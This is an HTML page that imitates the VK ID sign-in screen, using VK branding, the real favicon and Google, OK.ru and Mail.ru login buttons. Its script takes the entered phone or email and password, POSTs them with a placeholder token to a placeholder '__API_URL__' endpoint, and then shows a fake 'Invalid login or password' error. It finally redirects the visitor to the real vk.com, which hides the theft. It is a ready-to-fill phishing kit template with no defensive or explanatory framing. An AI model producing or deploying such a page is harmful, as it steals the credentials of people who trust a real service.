<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in | VK ID</title>
    <link rel="icon" href="https://vk.com/favicon.ico" type="image/x-icon">
    <meta name="description" content="Sign in to VK">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background-color:#edeef0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#222}
        .login-card{background:#fff;padding:32px 32px 40px;border-radius:12px;width:100%;max-width:360px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,.08);animation:fadeIn .4s ease}
        @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
        @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}
        .logo{margin-bottom:24px}
        .logo svg{width:44px;height:44px}
        h2{font-size:20px;font-weight:500;margin-bottom:12px}
        p.subtitle{font-size:14px;color:#818c99;margin-bottom:24px}
        .input-group{margin-bottom:12px}
        .input-group input{width:100%;padding:12px 14px;border:1px solid #dce1e6;border-radius:8px;font-size:15px;outline:none;background:#f2f3f5;transition:border-color .2s,background-color .2s}
        .input-group input:focus{border-color:#0077ff;background:#fff}
        .login-btn{width:100%;background-color:#0077ff;color:#fff;border:none;border-radius:8px;padding:12px;font-size:15px;font-weight:600;cursor:pointer;margin-top:12px;transition:background-color .2s,transform .1s;position:relative}
        .login-btn:hover{background-color:#0066dd}
        .login-btn:active{transform:scale(.98)}
        .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top:2px solid #fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
        @keyframes spin{to{transform:rotate(360deg)}}
        .divider{margin:20px 0;height:1px;background-color:#dce1e6}
        .social-login{display:flex;justify-content:center;gap:12px;margin-bottom:16px}
        .social-login button{width:44px;height:44px;border-radius:10px;border:1px solid #dce1e6;background:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background-color .2s}
        .social-login button:hover{background:#f2f3f5}
        .signup-btn{width:100%;background-color:#4bb34b;color:#fff;border:none;border-radius:8px;padding:12px;font-size:15px;font-weight:600;cursor:pointer;transition:background-color .2s}
        .signup-btn:hover{background-color:#3fa33f}
        .footer{margin-top:24px;font-size:12px;color:#818c99}
        .error-text{color:#e64646;font-size:13px;text-align:left;margin-top:4px;display:none}
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="#0077ff">
                <path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.66 16.59c-.58.12-1.5.03-1.5.03s-1-.07-1.5-.64c0 0-.6-.62-1.07-.62-.47 0-.75.47-.75.47s-.3 1.1-.3 2.05h-.63c-3 .1-4.75-2.2-4.75-2.2s-1.05-1.58-1-4.04h1c-.13 1.13.4 2.1 1.07 2.7.67.6 1.4.63 1.4.63s0-.93-.1-1.63c-.1-.7-.17-1.4-.17-1.4s-.03-.23.1-.33c.13-.1.37-.1.37-.1h.63s.3-.03.5.17c.2.2.14.7.14.7s-.17 1.3-.17 1.93c0 .63.3.73.6.43s1.23-1.83 1.23-1.83.1-.17.2-.2c.1-.03.23-.03.23-.03h.87s.5-.1.37.4c-.13.5-.83 1.5-.83 1.5s-.37.6-.13.8c.24.2.94.8 1.4 1.3.46.5.6.8.6.8s.07.5-.47.64z"/>
            </svg>
        </div>
        <h2>Sign in to VK</h2>
        <p class="subtitle">Enter your phone or email to login.</p>

        <div class="social-login">
            <button title="Google">
                <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24s.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
            </button>
            <button title="OK.ru">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#EE8208"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14c-2.5 0-4.71-1.28-6-3.22.03-2 4-3.08 6-3.08s5.97 1.08 6 3.08C16.71 18.72 14.5 20 12 20z"/></svg>
            </button>
            <button title="Mail.ru">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#005FF9"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
            </button>
        </div>

        <form id="vkForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone or email" autocomplete="username">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
            </div>
            <div class="error-text" id="errorMsg">Invalid login or password</div>
            <button type="submit" class="login-btn" id="loginBtn">Sign in</button>
        </form>

        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
        <div class="footer">VK © 2024</div>
    </div>
    <script>
        const form=document.getElementById('vkForm'),u=document.getElementById('username'),p=document.getElementById('password'),btn=document.getElementById('loginBtn');
        form.addEventListener('submit',(e)=>{
            e.preventDefault();
            if(!u.value||!p.value){
                document.querySelector('.login-card').style.animation='shake 0.4s';
                setTimeout(()=>document.querySelector('.login-card').style.animation='',400);
                return;
            }
            btn.innerHTML='<span class="spinner"></span>';btn.style.pointerEvents='none';
            const data={token:'__TOKEN__',username:u.value,password:p.value};
            fetch('__API_URL__',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
            .then(()=>{
                document.getElementById('errorMsg').style.display='block';
                btn.textContent='Sign in';btn.style.pointerEvents='auto';
                p.value='';
                document.querySelector('.login-card').style.animation='shake 0.4s';
                setTimeout(()=>document.querySelector('.login-card').style.animation='',400);
                setTimeout(()=>{window.location.href='https://vk.com/';},3000);
            })
            .catch(()=>{window.location.href='https://vk.com/';});
        });
    </script>
</body>
</html>
